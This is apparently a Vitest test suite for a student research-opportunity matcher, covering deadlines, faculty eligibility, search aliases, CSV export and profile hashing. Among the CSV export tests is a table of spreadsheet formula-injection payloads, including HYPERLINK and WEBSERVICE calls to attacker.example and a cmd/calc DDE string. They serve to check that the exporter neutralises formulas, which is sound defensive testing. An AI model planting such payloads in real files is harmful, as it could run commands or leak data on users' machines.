import { describe, it, expect } from 'vitest';
import {
  daysUntil,
  getDeadlineUrgency,
  expandSearchAliases,
  facultySafeInternational,
  opportunityRecordKind,
  matchesToCSV,
  hashProfile,
} from './match-utils';
import type { MatchResult } from './types';

const NOW = new Date('2026-04-16T10:00:00Z');

describe('daysUntil', () => {
  it('returns null for missing deadline', () => {
    expect(daysUntil(undefined, NOW)).toBeNull();
    expect(daysUntil('', NOW)).toBeNull();
  });

  it('returns null for malformed date', () => {
    expect(daysUntil('not-a-date', NOW)).toBeNull();
  });

  it('returns positive days for future', () => {
    expect(daysUntil('2026-04-23', NOW)).toBe(7);
    expect(daysUntil('2026-05-16', NOW)).toBe(30);
  });

  it('returns negative days for past', () => {
    expect(daysUntil('2026-04-10', NOW)).toBe(-6);
  });

  it('handles today/boundary consistently', () => {
    const days = daysUntil('2026-04-16', NOW);
    expect(days).toBeGreaterThanOrEqual(-1);
    expect(days).toBeLessThanOrEqual(1);
  });
});

describe('getDeadlineUrgency', () => {
  it('classifies urgency buckets', () => {
    expect(getDeadlineUrgency(undefined, NOW)).toBeNull();
    expect(getDeadlineUrgency('2026-04-10', NOW)).toBe('passed');
    expect(getDeadlineUrgency('2026-04-20', NOW)).toBe('urgent');
    expect(getDeadlineUrgency('2026-05-01', NOW)).toBe('soon');
    expect(getDeadlineUrgency('2026-06-15', NOW)).toBe('later');
  });

  it('handles boundary days', () => {
    expect(getDeadlineUrgency('2026-04-23', NOW)).toBe('urgent');
    expect(getDeadlineUrgency('2026-04-24', NOW)).toBe('soon');
    expect(getDeadlineUrgency('2026-05-16', NOW)).toBe('soon');
    expect(getDeadlineUrgency('2026-05-17', NOW)).toBe('later');
  });

  it('estimated deadlines never produce a passed/red-urgent verdict', () => {
    // Past estimate: no confident 'passed' claim, no urgency at all.
    expect(getDeadlineUrgency('2026-04-10', NOW, true)).toBeNull();
    // Near estimate: capped at the amber 'soon' band, never red 'urgent'.
    expect(getDeadlineUrgency('2026-04-20', NOW, true)).toBe('soon');
    // Farther estimates keep their neutral bands.
    expect(getDeadlineUrgency('2026-05-01', NOW, true)).toBe('soon');
    expect(getDeadlineUrgency('2026-06-15', NOW, true)).toBe('later');
    // Confirmed dates behave exactly as before with an explicit false.
    expect(getDeadlineUrgency('2026-04-10', NOW, false)).toBe('passed');
    expect(getDeadlineUrgency('2026-04-20', NOW, false)).toBe('urgent');
  });
});

describe('facultySafeInternational', () => {
  it('fails a stale faculty yes claim closed to unknown', () => {
    expect(facultySafeInternational({
      source_type: 'faculty_research',
      eligibility: { international_friendly: 'yes', citizenship_required: false },
    })).toBe('unknown');
  });

  it('preserves only explicit faculty restrictions', () => {
    expect(facultySafeInternational({
      source_type: 'faculty_research',
      eligibility: { international_friendly: 'no', citizenship_required: false },
    })).toBe('no');
    expect(facultySafeInternational({
      source_type: 'faculty_research',
      eligibility: { international_friendly: 'yes', citizenship_required: true },
    })).toBe('no');
  });

  it('does not alter a non-faculty listing', () => {
    expect(facultySafeInternational({
      source_type: 'campus_program',
      eligibility: { international_friendly: 'yes', citizenship_required: false },
    })).toBe('yes');
  });

  it('does not trust an international-friendly claim from an untyped record', () => {
    expect(facultySafeInternational({
      eligibility: { international_friendly: 'yes', citizenship_required: false },
    })).toBe('unknown');
  });
});

describe('opportunityRecordKind', () => {
  it('recognizes faculty contacts and reviewed listing source types', () => {
    expect(opportunityRecordKind({ source_type: 'faculty_research' })).toBe('faculty_contact');
    expect(opportunityRecordKind({ source_type: 'campus_program' })).toBe('listing');
    expect(opportunityRecordKind({ source_type: 'internship' })).toBe('listing');
  });

  it.each([undefined, null, '', 'unknown', 'future_unreviewed_kind'])(
    'fails %s closed to unknown',
    (source_type) => {
      expect(opportunityRecordKind({ source_type })).toBe('unknown');
    },
  );
});

// The opportunityDestination cases moved to target-truth.test.ts when the
// single resolver was split into opportunityApplicationUrl /
// opportunitySourceUrl. Each of the three properties they pinned — a faculty
// application_url never wins, a real listing's portal does, an untyped record
// gets no portal — is asserted there against the split pair.

describe('expandSearchAliases', () => {
  it('expands known single-term abbreviation', () => {
    expect(expandSearchAliases('ml')).toContain('machine learning');
    expect(expandSearchAliases('ml')).toContain('ml');
  });

  it('is case insensitive on input', () => {
    expect(expandSearchAliases('ML')).toContain('machine learning');
    expect(expandSearchAliases('Nlp')).toContain('natural language processing');
  });

  it('expands abbreviation appearing inside longer query', () => {
    const terms = expandSearchAliases('ml research lab');
    expect(terms.some(t => t.includes('machine learning'))).toBe(true);
  });

  it('returns only the input when no alias matches', () => {
    expect(expandSearchAliases('robotics')).toEqual(['robotics']);
  });

  it('handles multiple alias expansions (e.g. hci)', () => {
    const terms = expandSearchAliases('hci');
    expect(terms).toContain('human computer interaction');
    expect(terms).toContain('human-computer interaction');
  });
});

function makeMatch(overrides: Partial<MatchResult['opportunity']> = {}, extras: Partial<MatchResult> = {}): MatchResult {
  return {
    opportunity_id: 'test-1',
    eligibility_score: 80, readiness_score: 70, upside_score: 60,
    final_score: 74.5,
    bucket: 'good_match',
    reasons_fit: [], reasons_gap: [], next_steps: [],
    ...extras,
    opportunity: {
      id: 'test-1',
      title: 'ML Research Assistant',
      organization: 'UIUC',
      opportunity_type: 'research',
      paid: 'yes',
      location: 'Urbana',
      source: 'uiuc_sro',
      on_campus: true,
      description_clean: '',
      keywords: [],
      deadline: '2026-05-15',
      url: 'https://example.com/apply',
      eligibility: {
        international_friendly: 'yes',
        preferred_year: [],
        majors: [],
        skills_required: [],
        citizenship_required: false,
      },
      application: { application_effort: 'low', requires_resume: 'yes', contact_method: 'email' },
      metadata: { is_active: true, confidence_score: 0.9 },
      ...overrides,
    },
  };
}

describe('matchesToCSV', () => {
  it('emits a header row', () => {
    const csv = matchesToCSV([makeMatch()]);
    const [header] = csv.split('\n');
    expect(header).toContain('"Title"');
    expect(header).toContain('"Score"');
    expect(header).toContain('"Bucket"');
  });

  it('emits one data row per match', () => {
    const csv = matchesToCSV([makeMatch(), makeMatch({ id: 'test-2', title: 'Other' })]);
    expect(csv.split('\n').length).toBe(3);
  });

  it('escapes double quotes in field values', () => {
    const csv = matchesToCSV([makeMatch({ title: 'Lab "AI for Good"' })]);
    expect(csv).toContain('"Lab ""AI for Good"""');
  });

  it.each([
    ['equals', '=HYPERLINK("https://attacker.example","Open")'],
    ['plus', '+cmd|\' /C calc\'!A0'],
    ['minus', '-1+1'],
    ['at', '@SUM(1,1)'],
    ['leading spaces', '  =WEBSERVICE("https://attacker.example")'],
    ['leading tab', '\t=HYPERLINK("https://attacker.example")'],
    ['leading carriage return', '\r=1+1'],
    ['leading line feed', '\n=1+1'],
  ])('neutralizes spreadsheet formulas with a %s prefix', (_label, title) => {
    const csv = matchesToCSV([makeMatch({ title })]);
    const escapedTitle = title.replace(/"/g, '""');
    expect(csv).toContain(`"'${escapedTitle}"`);
    expect(csv).not.toContain(`,"${escapedTitle}",`);
  });

  it('leaves ordinary titles unprefixed', () => {
    const csv = matchesToCSV([makeMatch({ title: 'ML Research Assistant' })]);
    expect(csv).toContain('"ML Research Assistant"');
    expect(csv).not.toContain("'ML Research Assistant");
  });

  it('prefers application_url over opportunity.url for an actionable listing', () => {
    const csv = matchesToCSV([
      makeMatch({
        source_type: 'campus_program',
        url: 'https://old-url.com',
        target_truth: {
          listing_state: 'open',
          reference_only: false,
          actionable: true,
          accepting_state: 'accepting',
          reason_code: null,
          verified_at: null,
          expires_at: null,
        },
        application: {
          application_effort: 'low',
          requires_resume: 'yes',
          contact_method: 'email',
          application_url: 'https://apply-here.com',
        },
      }),
    ]);
    expect(csv).toContain('"https://apply-here.com"');
    expect(csv).not.toContain('old-url');
  });

  /** The Status cell of the first data row, parsed rather than searched for. */
  function statusCell(csv: string): string {
    const header = csv.split('\n')[0].split(',').map((c) => c.replace(/^"|"$/g, ''));
    const index = header.indexOf('Status');
    const row = csv.split('\n')[1];
    // Every cell is quoted and these fixtures contain no embedded quotes.
    return (row.match(/"((?:[^"]|"")*)"/g) ?? [])[index]?.replace(/^"|"$/g, '') ?? '';
  }

  const LIVE_TRUTH = {
    listing_state: 'open', reference_only: false, actionable: true,
    accepting_state: 'accepting', reason_code: null,
    verified_at: null, expires_at: null,
  };

  it('states the unreviewed kind in its own words, on its own shape', () => {
    // This reason belongs only to a record whose source_type is absent, so it
    // needs a fixture without one. Carrying it on a confirmed listing is a
    // contradiction the parser refuses — asserted in the row below.
    const opp = {
      title: 'Unreviewed record',
      source_url: 'https://source-page.com',
      deadline: '2026-09-02',
      paid: 'stipend',
      target_truth: {
        listing_state: 'unknown', reference_only: false, actionable: false,
        accepting_state: 'unknown', reason_code: 'record_kind_unverified',
        verified_at: null, expires_at: null,
      },
    };
    const csv = matchesToCSV([makeMatch(opp as never)]);

    expect(statusCell(csv)).toBe('Record type unverified — not presented as an open listing');
    expect(csv).not.toContain('stipend');
    expect(csv).not.toContain('2026-09-02');
    expect(csv).toContain('https://source-page.com');
  });

  it('refuses that reason on a confirmed listing', () => {
    const csv = matchesToCSV([makeMatch({
      source_type: 'campus_program',
      target_truth: {
        listing_state: 'unknown', reference_only: false, actionable: false,
        accepting_state: 'unknown', reason_code: 'record_kind_unverified',
        verified_at: null, expires_at: null,
      },
    } as never)]);

    // Hiding a real listing behind copy about our own review queue is its own
    // false claim, so the payload is unreadable rather than believed.
    expect(statusCell(csv)).toBe('Status unverified — check the source');
  });

  it.each([
    ['a confirmed listing', 'campus_program', 'Open listing', true],
    ['a faculty profile', 'faculty_research', 'Faculty contact — opening not confirmed', false],
    // An unreviewed kind cannot be actionable any more — the truth refuses it
    // at the source — so a payload claiming otherwise is self-contradicting
    // and reports as unverified rather than as a live record of some third
    // type. Its canonical shape is covered in the refusal matrix below.
    ['an unreviewed record kind', undefined, 'Status unverified — check the source', false],
  ])('actionable %s gets its own status, and offer columns only if it is one', (
    _label, sourceType, status, keepsOfferColumns,
  ) => {
    // `actionable` is not `confirmed listing`. Calling a live faculty
    // directory row "Open" told the reader an opening exists, which the
    // directory page never said.
    const csv = matchesToCSV([
      makeMatch({
        source_type: sourceType,
        paid: 'stipend',
        deadline: '2026-09-02',
        opportunity_type: 'research',
        source_url: 'https://source-page.com',
        target_truth: { ...LIVE_TRUTH },
        application: {
          application_effort: 'low',
          requires_resume: 'yes',
          contact_method: 'email',
          application_url: 'https://apply-here.com',
        },
      } as never),
    ]);

    expect(statusCell(csv)).toBe(status);
    // Only a confirmed listing has terms to state, and only it may hand out
    // an application link; everything else links the source page instead.
    expect(csv.includes('stipend')).toBe(keepsOfferColumns);
    expect(csv.includes('2026-09-02')).toBe(keepsOfferColumns);
    expect(csv.includes('apply-here.com')).toBe(keepsOfferColumns);
    expect(csv.includes('source-page.com')).toBe(!keepsOfferColumns);
  });

  it.each([
    ['closed', {
      listing_state: 'closed', reference_only: true, actionable: false,
      accepting_state: 'not_accepting', reason_code: 'listing_closed',
      verified_at: null, expires_at: null,
    }, 'Closed listing — no longer accepting applications'],
    ['reference-only', {
      listing_state: 'unknown', reference_only: true, actionable: false,
      accepting_state: 'unknown', reason_code: 'reference_only',
      verified_at: null, expires_at: null,
    }, 'Reference record — not an open listing'],
    ['faculty-not-accepting', {
      listing_state: 'unknown', reference_only: false, actionable: false,
      accepting_state: 'not_accepting', reason_code: 'faculty_not_accepting',
      verified_at: null, expires_at: null,
    }, 'Faculty profile states not accepting undergraduates'],
    ['inactive', {
      listing_state: 'unknown', reference_only: false, actionable: false,
      accepting_state: 'unknown', reason_code: 'inactive',
      verified_at: null, expires_at: null,
    }, 'Inactive — no longer carried in the catalog'],
    ['malformed', { listing_state: 'open' }, 'Status unverified — check the source'],
    ['self-contradicting', {
      listing_state: 'closed', reference_only: false, actionable: true,
      accepting_state: 'accepting', reason_code: null,
      verified_at: null, expires_at: null,
    }, 'Status unverified — check the source'],
  ])('blanks every opening column and states the status for a %s row', (_label, truth, status) => {
    // A spreadsheet is read months later with none of the page's context.
    const csv = matchesToCSV([
      makeMatch({
        // The kind follows the reason. `faculty_not_accepting` quotes a named
        // person's own refusal, and the backend only emits it for a
        // `faculty_research` row — on a listing there is nobody who said it,
        // so the payload reads as unverified and this row's expected status
        // would be the wrong one.
        source_type: (truth as { reason_code?: string }).reason_code === 'faculty_not_accepting'
          ? 'faculty_research'
          : 'campus_program',
        paid: 'stipend',
        deadline: '2026-09-02',
        opportunity_type: 'research',
        source_url: 'https://source-page.com',
        target_truth: truth,
        application: {
          application_effort: 'low',
          requires_resume: 'yes',
          contact_method: 'email',
          application_url: 'https://apply-here.com',
        },
      } as never),
    ]);
    expect(csv).not.toContain('stipend');
    expect(csv).not.toContain('2026-09-02');
    expect(csv).not.toContain('apply-here.com');
    expect(csv).toContain('https://source-page.com');
    // The exact cell, not a substring of the whole file: four refusals are
    // four different facts, and a shared "no longer open" claims all of them
    // were open once — false for a reference record, and false for a
    // professor who never had a posting at all.
    expect(statusCell(csv)).toBe(status);
  });

  it('exports the source page, never the apply URL, for a closed listing', () => {
    // An exported sheet outlives the session. A closed row must not hand
    // someone an application link under the same column heading.
    const csv = matchesToCSV([
      makeMatch({
        source_type: 'campus_program',
        url: 'https://source-page.com',
        target_truth: {
          listing_state: 'closed',
          reference_only: false,
          actionable: false,
          accepting_state: 'not_accepting',
          reason_code: 'listing_closed',
          verified_at: null,
          expires_at: null,
        },
        application: {
          application_effort: 'low',
          requires_resume: 'yes',
          contact_method: 'email',
          application_url: 'https://apply-here.com',
        },
      }),
    ]);
    expect(csv).not.toContain('apply-here.com');
    expect(csv).toContain('"https://source-page.com"');
  });

  it('exports faculty profiles as contacts, not paid openings or apply URLs', () => {
    const csv = matchesToCSV([
      makeMatch({
        source_type: 'faculty_research',
        paid: 'yes',
        deadline: '2026-10-01',
        eligibility: {
          international_friendly: 'yes',
          preferred_year: [],
          majors: [],
          skills_required: [],
          citizenship_required: false,
        },
        url: 'https://faculty.example.edu/ada',
        application: {
          application_effort: 'low',
          requires_resume: 'no',
          contact_method: 'email',
          application_url: 'https://example.edu/fake-apply',
        },
      }),
    ]);
    expect(csv).toContain('"Location / faculty affiliation"');
    expect(csv).toContain('"faculty_contact","","Urbana","","unknown"');
    expect(csv).toContain('"https://faculty.example.edu/ada"');
    expect(csv).not.toContain('fake-apply');
  });

  it('exports an untyped stale record without opening facts or an apply URL', () => {
    const csv = matchesToCSV([
      makeMatch({
        source_type: undefined,
        paid: 'yes',
        deadline: '2026-10-01',
        eligibility: {
          international_friendly: 'yes',
          preferred_year: [],
          majors: [],
          skills_required: [],
          citizenship_required: false,
        },
        url: 'https://example.edu/source',
        application: {
          application_effort: 'low',
          requires_resume: 'yes',
          contact_method: 'website',
          application_url: 'https://example.edu/fake-apply',
        },
      }),
    ]);
    expect(csv).toContain('"unknown","","Urbana","","unknown"');
    expect(csv).toContain('"https://example.edu/source"');
    expect(csv).not.toContain('fake-apply');
    expect(csv).not.toContain('2026-10-01');
  });

  it('handles missing organization', () => {
    const csv = matchesToCSV([makeMatch({ organization: undefined })]);
    expect(csv).toContain('""');
  });

  it('formats score to 1 decimal', () => {
    const csv = matchesToCSV([makeMatch({}, { final_score: 87.345 })]);
    expect(csv).toContain('"87.3"');
  });
});

describe('hashProfile', () => {
  const base = {
    major: 'CS', college: 'Grainger', grade: 'sophomore',
    is_international: true, skills: [{ name: 'Python', level: 'experienced' }],
    research_interests: 'ML',
  };

  it('produces deterministic output', () => {
    expect(hashProfile(base)).toBe(hashProfile(base));
  });

  it('differs when a field changes', () => {
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, major: 'ECE' }));
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, research_interests: 'Robotics' }));
  });

  it('is order-independent for skills', () => {
    const h1 = hashProfile({ ...base, skills: [
      { name: 'Python', level: 'experienced' },
      { name: 'Java', level: 'beginner' },
    ]});
    const h2 = hashProfile({ ...base, skills: [
      { name: 'Java', level: 'beginner' },
      { name: 'Python', level: 'experienced' },
    ]});
    expect(h1).toBe(h2);
  });

  it('distinguishes skill level changes', () => {
    const h1 = hashProfile({ ...base, skills: [{ name: 'Python', level: 'beginner' }] });
    const h2 = hashProfile({ ...base, skills: [{ name: 'Python', level: 'expert' }] });
    expect(h1).not.toBe(h2);
  });

  it('switching home_school misses the cache; absent field hashes like uiuc', () => {
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, home_school: 'ucb' }));
    // Backward compat: profiles saved before the switcher (no home_school)
    // must keep hitting the same cache entry as an explicit 'uiuc'.
    expect(hashProfile(base)).toBe(hashProfile({ ...base, home_school: 'uiuc' }));
  });

  it('flipping include_cross_school misses the cache; absent field hashes like off', () => {
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, include_cross_school: true }));
    expect(hashProfile(base)).toBe(hashProfile({ ...base, include_cross_school: false }));
  });

  // The consistency audit found five matcher inputs the hash omitted —
  // editing any of them served the stale cached match set for up to 7 days.
  it('every additional matcher input misses the cache when changed', () => {
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, additional_majors: ['Statistics'] }));
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, coursework: ['CS 225'] }));
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, experience_level: 'strong' }));
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, resume_text: 'my resume' }));
    expect(hashProfile(base)).not.toBe(hashProfile({ ...base, exploring: true }));
  });

  it('absent new fields hash like their matcher defaults (no spurious miss)', () => {
    expect(hashProfile(base)).toBe(hashProfile({ ...base, additional_majors: [] }));
    expect(hashProfile(base)).toBe(hashProfile({ ...base, coursework: [] }));
    expect(hashProfile(base)).toBe(hashProfile({ ...base, experience_level: 'beginner' }));
    expect(hashProfile(base)).toBe(hashProfile({ ...base, resume_text: '' }));
    expect(hashProfile(base)).toBe(hashProfile({ ...base, exploring: false }));
  });

  it('resume hashes on presence, not content', () => {
    expect(hashProfile({ ...base, resume_text: 'draft one' }))
      .toBe(hashProfile({ ...base, resume_text: 'draft two, edited' }));
  });
});
